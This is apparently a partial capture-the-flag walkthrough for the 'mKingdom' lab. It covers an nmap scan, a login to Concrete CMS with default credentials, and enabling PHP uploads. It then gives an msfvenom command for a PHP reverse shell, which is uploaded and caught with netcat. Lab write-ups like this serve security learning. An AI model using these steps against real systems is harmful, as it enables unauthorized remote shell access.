# mKingdom

### It's-a-me!

Initial nmap scan shows port 85 open:

    nmap -sC -sV -p85 10.10.137.9                 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 12:58 EDT
    Nmap scan report for 10.10.137.9
    Host is up (0.054s latency).
    
    PORT   STATE SERVICE VERSION
    85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-title: 0H N0! PWN3D 4G4IN
    |_http-server-header: Apache/2.4.7 (Ubuntu)
Gobuster directory enumeration shows /app directory, which eventually leads me to `http://10.10.137.9:85/app/castle/`<br />
![image](https://github.com/user-attachments/assets/5b5eae1c-9472-4d91-8070-0edacb0a1249)<br />
As you can see from the image above, Wappalyzer shows that this server is running `Concrete CMS 8.5.2`. After some online search and website enumeration, I found the following page `http://10.10.137.9:85/app/castle/index.php/login`:<br />
![image](https://github.com/user-attachments/assets/994cb771-e08d-42af-9f77-93b6ce5159ef)<br />
I tried with `admin:password`, and it worked, lol. Now I can exploit a vulnerability that i found [here](https://hackerone.com/reports/768322). Follow the steps provided in this guide:<br />
Add .php in the allowed file types: <br />
![image](https://github.com/user-attachments/assets/76e8c642-45ab-4bfe-96d1-62cfbf2efb84)<br />
Now generate a php revershe shell with msfvenom: `msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php`.<br />
Now upload it:<br />
![image](https://github.com/user-attachments/assets/6cdf3097-1912-47c2-b9fc-abd5deb962e4)<br />
Now open a netcat listener and click on the created link: <br />
![image](https://github.com/user-attachments/assets/7b301926-ee80-436e-87b7-0b8199e01bc6)<br />
Nice:<br />
![image](https://github.com/user-attachments/assets/7340f0ee-89cf-46b4-96c2-62d18e7381c0)<br />







- What is user.txt?
- What is root.txt?
